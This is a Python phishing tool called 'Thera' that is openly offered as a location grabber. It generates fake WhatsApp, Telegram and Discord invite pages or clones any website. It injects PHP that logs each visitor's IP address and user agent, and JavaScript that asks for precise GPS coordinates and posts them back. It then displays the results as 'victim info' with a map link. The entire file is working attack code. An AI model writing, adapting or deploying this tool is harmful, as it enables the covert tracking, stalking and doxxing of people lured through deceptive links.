# Thera - location grabber powered by med
# the developer's not responsible of any misuse
# developer: INSTAGRAM @pq00 ~ GITHUB @u0r
# version 1.0

import os
import subprocess
import requests
import datetime
import json
import sys
import shutil
from bs4 import BeautifulSoup as btfs
from sites.whatsapp import s1setup
from sites.telegram import s2setup
from sites.discordpc import s3setup
from sites.discordmob import s4setup

class COLORS:
    cyan = '\033[96m'
    red = '\033[91m'
    white = '\033[0;97m'
    gray = '\033[90m'
    green = '\033[1;32m'
    yellow = '\033[1;33m'

class BANNERS():
    banner = f"""{COLORS.white}         .m.                                   ,_
         ' ;M;                                ,;m `
           ;M;.           ,      ,           ;MED;
          ;;Mm;         ,;        ;,         ;REI;
         ;;;MM;        ; (        ) ;       ,ROOT;;
       ,;;;YEA'        l  ';____;/  j       HACK!;;     made by {COLORS.red}root@med:~#{COLORS.white}
     .;;;;;NO;         .\,.mmSSSm,,/,      ,HACK!;;;         IG : @pq00
    ;;;;;;MED;        .;MMmSSSSSSSmMm;     ;HACK!;;;;
   ;;;;;;ROOT;     :-_;MMmS;;;;;;mmmMs;_-:;NULL000;;;;
  ;;;;;;;HACK!;     \\"*;M;( ( | ) );m;*"/ ;HELLO!;;;;;,
 .;;;;;;NOTBAD;      \(@;!         !;@)/ ;LOOKATME;;;;;,
 ;;;;;;;HACKER;       ;,;. _ > < _ .;m; ;LOVEMENOW;;;;;;,
.;;;;;;;CANTSEE;     ;Mm;           ;M;,OBSECURETEAM;;;;;.
;;;;;;;TREMBLINFEAR, ;Mm;     -     ;M;MADEINPYTHON3;;;;;;;
;;;;;;;NEVERLOOKBACK!;Mm;;   ___   ;SmM;ECHOECHOECHO;;;;;;;;
;;'";;;ITSNOTSOBAD:/;MMmS;;,  '  ,;SmMM;HACKER.EXPLOIT;;;;;;.
!   ;;;HOWABOUTME???;MMMmSS;;._.;;SSmMM;WHYCANTISEE???;;;;;;;
    ;;;;*JUSTFUCKIT!;Mm*"'q;'   `;p*"*M;WHEREAREYOURN;;;;;;;;
    ';;;  ;HI*YOU*M;M;'     `-.        ;;ROOT@MED:~#;;;;;;;;;
     ;;;. ;P  `q; qMM.      {COLORS.red}THERA{COLORS.white}      ';ROOT@REI:~#' ';;;;;;
     ;;;; ',    ; .mm!     \.   `.   /  ;MED' `REI'    ';;;;
      ';;       '  mS';     ;     ,  `. ;'M'   `R       ';;

    [{COLORS.red}04 sites{COLORS.white}]-[{COLORS.red}site cloner{COLORS.white}]-[{COLORS.red}={COLORS.white}]-[{COLORS.red}works with php{COLORS.white}]-[{COLORS.red}ver1.0{COLORS.white}]
             [{COLORS.red}1{COLORS.white}] sites [{COLORS.red}2{COLORS.white}] site cloner [{COLORS.red}3{COLORS.white}] exit
"""
    sites = f"""{COLORS.white}
[{COLORS.red}01{COLORS.white}] whatsapp    [{COLORS.red}02{COLORS.white}] telegram    [{COLORS.red}03{COLORS.white}] discordpc   [{COLORS.red}04{COLORS.white}] discrod mobile
"""

def startserver(serverpath):
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Starting php server")
    nul = ""
    osn = os.name
    if osn == "nt":
        nul = "NUL"
    else:
        nul = "/dev/null"
    subprocess.Popen(
        f"cd {serverpath} && php -S 127.0.0.1:8000 > {nul} 2>&1",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
        )
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: php server started 127.0.0.1:8000")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: start your ngrok server on port 8000")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: check your local host at 127.0.0.1:8000")

def reader():
    while True:
        try:
            out = open("site/files/info/out.txt")
            break
        except FileNotFoundError:
            try:
                out = open("site/files/info/error_out.txt")
                break
            except FileNotFoundError:
                pass
    try:
        jsondata = json.load(out)
        return jsondata
    except:
        pass

def clear():
    lin,win = "clear","cls"
    os.system([lin,win][os.name=='nt'])

def now():
    now = datetime.datetime.now().strftime("%H:%M:%S")
    return now

def ext():
    if os.path.exists("clonedsite"):
        shutil.rmtree("clonedsite", ignore_errors=True)
        os.mkdir("clonedsite")
    for i in os.listdir("site/files/icons"):
        if os.path.exists(f"site/files/icons/{i}"):
            os.remove(f"site/files/icons/{i}")
    if os.path.exists("site/index.php"):
        os.remove("site/index.php")
    sys.exit(f"\n\r[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Exited{COLORS.white}")

def getinf(ip):
    url = f"http://ipinfo.io/{ip}/geo"
    info = requests.get(url).json()
    return info

def dataprint(data):
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}LAT{COLORS.white}]: ",data["lat"])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}LON{COLORS.white}]: ",data["lon"])
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}GOOGLE MAPS{COLORS.white}]: https://www.google.com/maps/place/{data['lat'].strip(' deg')}+{data['lon'].strip(' deg')}")
    print("")

def infoprint(data):
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}CITY{COLORS.white}]: ",data['city'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}REGION{COLORS.white}]: ",data['region'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}COUNTRY{COLORS.white}]: ",data['country'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}ISP{COLORS.white}]: ",data['org'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}LOCATION{COLORS.white}]: ",data['loc'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}TIMEZONE{COLORS.white}]: ",data['timezone'])
    print("")

def ipprint(data):
    print(f"\n[{COLORS.cyan}+{COLORS.white}]====================[{COLORS.green}VICTIM INFO{COLORS.white}]====================[{COLORS.cyan}+{COLORS.white}]")
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}IP{COLORS.white}]: ",data['ip'])
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.green}AGENT{COLORS.white}]: ",data['agent'])

def errorprint(data):
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]-[{COLORS.red}DENIED{COLORS.white}]: {data['error']}")
    print("")

def sites():
    c2 = int(input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}THERA{COLORS.white}]-[{COLORS.red}SITES{COLORS.white}]> "))
    match c2:
        case 1:
            print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: this will make a fake whatsapp group invite's link")
            s1setup()
        case 2:
            print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: this will make a fake telegram channel invite's link")
            s2setup()
        case 3:
            print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: this will make a fake discord server invite's link for pc")
            s3setup()
        case 4:
            print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: this will make a fake discord server invite's link for mobile")
            s4setup()
        case _:
            print(f"\n[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error: choose a number from the showin above.{COLORS.white}\n")
            sites()

def cloner():
    print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.yellow}WARNING{COLORS.white}]: write the full url for example: https://www.example.com")
    url = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}SITE URL{COLORS.white}]> ")
    
    if "http://" in url:
        url = url.replace("http","https")
    if "https://" not in url:
        url = "https://"+url

    print(f"\n[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Setting up the directories.")
    if os.path.exists("clonedsite"):
        shutil.rmtree("clonedsite", ignore_errors=True)
        os.mkdir("clonedsite")
    else:
        os.mkdir("clonedsite")
    
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Copying the index file.")
    siteindex = requests.get(url).text

    soup = btfs(siteindex,'html.parser')
    url1 = "https://"+url.split("/")[2]

    csslinks = []
    jslinks = []
    imglinks = []

    cssdirs = []
    jsdirs = []
    imgdirs = []

    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Scraping the css files.")
    css = soup.find_all('link')
    for i in range(len(css)):
        try:
            link = css[i]['href']
            if "css" in link:
                if "http" not in link or "https" not in link:
                    cssdirs.append(link)
                    link = url1+link
                    csslinks.append(link)
        except:
            pass

    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Scraping the js files.")
    js = soup.find_all('script')
    for i in range(len(js)):
        try:
            link = js[i]['src']
            if "http" not in link or "https" not in link:
                jsdirs.append(link)
                link = url1+link
                jslinks.append(link)
        except:
            pass

    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Scraping the images.")
    img = soup.find_all('img')
    for i in range(len(img)):
        try:
            link = img[i]['src']
            if "http" not in link or "https" not in link:
                imgdirs.append(link)
                link = url1+link
                imglinks.append(link)
        except:
            pass

    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Generating index.php file.")
    tempindex = """<?php
    function getip()
    {
        $ip = null;
        if(isset($_SERVER))
        {
            if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }
            elseif(isset($_SERVER['HTTP_CLIENT_IP']))
            {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
            else
            {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
        }
        else
        {
            if(getenv('HTTP_X_FORWARDED_FOR'))
            {
                $ip = getenv('HTTP_X_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_CLIENT_IP'))
            {
                $ip = getenv('HTTP_CLIENT_IP');
            }
            else
            {
                $ip = getenv('REMOTE_ADDR');
            }
        }
        return $ip;
    }
    function getagent()
    { 
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        return $useragent;
    }
    $ip = getip();
    $agent = getagent();
    $out = array(
        'status' => 'ip_info',
        'ip' => $ip,
        'agent' => $agent
    );
    $jsondata = json_encode($out);
    file_put_contents("../site/files/info/out.txt", $jsondata);
    ?>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/loc.js"></script>
    $INDEX$"""

    with open("clonedsite/index.php", 'w', encoding='utf-8') as index:
        tempindex = tempindex.replace("$INDEX$", siteindex)
        index.write(tempindex)
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The index.php is Generated successfully.")

    # php files setup
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Setting up the php files.")
    locphp = """<?php
    $lat = $_POST['LAT'];
    $lon = $_POST['LON'];

    $data = array(
        'status' => 'ok',
        'lat' => $lat,
        'lon' => $lon
    );

    $josndata = json_encode($data);
    $file = fopen('../../site/files/info/out.txt', 'w');
    fwrite($file, $josndata); fclose($file);
    ?>"""

    errorphp = """<?php
    $den = $_POST['DEN'];
    $una = $_POST['UNA'];
    $time = $_POST['TIME'];
    $unk = $_POST['UNK'];
    $sup = 'Geolocation is not supported !';

    if(isset($den))
    {
        $data = array(
            'status' => 'error',
            'error' => $den
        );
        $jsondata = json_encode($data);
        $file = fopen('../../site/files/info/error_out.txt', 'w');
        fwrite($file, $jsondata); fclose($file);
    }
    elseif(isset($una))
    {
        $data = array(
            'status' => 'error',
            'error' => $una
        );
        $jsondata = json_encode($DATA);
        $file = fopen('../../site/files/info/error_out.txt', 'w');
        fwrite($file, $jsondata); fclose($file);
    }
    elseif(isset($time))
    {
        $data = array(
            'status' => 'error',
            'error' => $time
        );
        $jsondata = json_encode($data);
        $file = fopen('../../site/files/info/error_out.txt', 'w');
        fwrite($file, $jsondata); fclose($file);
    }
    elseif(isset($unk))
    {
        $data = array(
            'status' => 'error',
            'error' => $unk
        );
        $jsondata = json_encode($data);
        $file = fopen('../../site/files/info/error_out.txt', 'w');
        fwrite($file, $jsondata); fclose($file);
    }
    else
    {
        $data = array(
            'status' => 'error',
            'error' => $sup
        );
        $jsondata = json_encode($data);
        $file = fopen('../../site/files/info/error_out.txt', 'w');
        fwrite($file, $jsondata); fclose($file);
    }
    ?>"""

    try:
        os.makedirs("clonedsite/php")
    except FileExistsError:
        pass

    with open("clonedsite/php/loc.php", 'w', encoding='utf-8') as index:
        index.write(locphp)
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: loc.php file has generated succesfully.")
    
    with open("clonedsite/php/error.php", 'w', encoding='utf-8') as index:
        index.write(errorphp)
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: error.php file has generated succesfully.")

    # js file setup
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Setting up the js files.")
    locjs = """if(navigator.geolocation)
    {
        var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
        navigator.geolocation.getCurrentPosition(spos, serr, optn);
    }
    else
    {
        alert('Geolocation is not Supported by your Browser...');
    }
    function spos(position)
    {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        $.ajax({
            type:'POST',
            url:'/php/loc.php',
            data:{
                LAT:lat,
                LON:lon}
                });
    }
    function serr(error)
    {
        switch(error.code)
        {
            case error.PERMISSION_DENIED:
                var den = 'User denied the request for Geolocation'; break;
            case error.POSITION_UNAVAILABLE:
                var una = 'Location information is unavailable'; break;
            case error.TIMEOUT:
                var time = 'The request to get user location timed out'; break;
            case error.UNKNOWN_ERROR:
                var unk = 'An unknown error occurred'; break;
        }
        $.ajax({
            type:'POST',
            url:'/php/error.php',
            data:{
                DEN:den,
                UNA:una,
                TIME:time,
                UNK:unk}
            });
    }"""

    try:
        os.makedirs("clonedsite/js")
    except FileExistsError:
        pass

    with open("clonedsite/js/loc.js", 'w', encoding='utf-8') as index:
        index.write(locjs)
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: loc.js file has generated succesfully.")

    # css files donwload
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading the css files from the site.")
    for i in range(len(csslinks)):
        try:
            os.makedirs("clonedsite"+os.path.dirname(cssdirs[i]))
        except FileExistsError:
            pass
    for i in range(len(cssdirs)):
        filecontent = requests.get(csslinks[i]).text
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading {csslinks[i]}.")
        with open("clonedsite"+cssdirs[i], 'w', encoding="utf-8") as file:
            file.write(filecontent)

    # js files download
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading the js files from the site.")
    for i in range(len(jslinks)):
        try:
            os.makedirs("clonedsite"+os.path.dirname(jsdirs[i]))
        except FileExistsError:
            pass
    for i in range(len(jsdirs)):
        filecontent = requests.get(jslinks[i]).text
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading {jslinks[i]}.")
        with open("clonedsite"+jsdirs[i], 'w', encoding="utf-8") as file:
            file.write(filecontent)

    # img files download
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading the images from the site.")
    for i in range(len(imglinks)):
        try:
            os.makedirs("clonedsite"+os.path.dirname(imgdirs[i]))
        except FileExistsError:
            pass
    for i in range(len(imgdirs)):
        filecontent = requests.get(imglinks[i], stream=True)
        filecontent.raw.decode_content = True
        print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Downloading {imglinks[i]}.")
        with open("clonedsite"+imgdirs[i], 'wb') as file:
            shutil.copyfileobj(filecontent.raw,file)
    
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The site has cloned succesfully.")

def main():
    c1 = int(input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}THERA{COLORS.white}]> "))
    serverpath = ""
    if c1 == 1:
        print(BANNERS.sites)
        sites()
        serverpath = "site"
    elif c1 == 2:
        cloner()
        serverpath = "clonedsite"
    elif c1 == 3:
        ext()
    else:
        print(f"\n[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error: choose a number from the showing above.{COLORS.white}\n")
        main()
    print("")
    startserver(serverpath)
    while True:
        try:
            data = reader()
            status = data['status']
            if status == "error":
                errorprint(data)
            elif status == "ok":
                dataprint(data)
            elif status == "ip_info":
                ipprint(data)
                try:
                    infoprint(getinf(data['ip']))
                except KeyError:
                    print(F"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error: this ip has no info to show.{COLORS.white}")
            if os.path.exists("site/files/info/out.txt"):
                os.remove("site/files/info/out.txt")
            if os.path.exists("site/files/info/error_out.txt"):
                os.remove("site/files/info/error_out.txt")
        except KeyboardInterrupt:
            if os.path.exists("clonedsite"):
                shutil.rmtree("clonedsite", ignore_errors=True)
            for i in os.listdir("site/files/icons"):
                if os.path.exists(f"site/files/icons/{i}"):
                    os.remove(f"site/files/icons/{i}")
            if os.path.exists("site/files/info/out.txt"):
                os.remove("site/files/info/out.txt")
            if os.path.exists("site/files/info/error_out.txt"):
                os.remove("site/files/info/error_out.txt")
            if os.path.exists("site/index.php"):
                os.remove("site/index.php")
            print(f"\n[{COLORS.cyan}+{COLORS.white}]====================[{COLORS.cyan}SESSION ENDED{COLORS.white}]====================[{COLORS.cyan}+{COLORS.white}]")
            print(BANNERS.banner)
            try:
                main()
            except KeyboardInterrupt:
                ext()
            except EOFError:
                ext()

if __name__ == '__main__':
    if os.path.exists("clonedsite"):
        shutil.rmtree("clonedsite", ignore_errors=True)
        os.mkdir("clonedsite")
    else:
        os.mkdir("clonedsite")
    for i in os.listdir("site/files/icons"):
        if os.path.exists(f"site/files/icons/{i}"):
            os.remove(f"site/files/icons/{i}")
    if os.path.exists("site/files/info/out.txt"):
        os.remove("site/files/info/out.txt")
    if os.path.exists("site/index.php"):
        os.remove("site/index.php")
    if os.path.exists("site/files/info/error_out.txt"):
        os.remove("site/files/info/error_out.txt")
    try:
        clear()
        print(BANNERS.banner)
        main()
    except ValueError:
        sys.exit(f"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error: this input accepts numbers 0-9.{COLORS.white}")
    except KeyboardInterrupt:
        ext()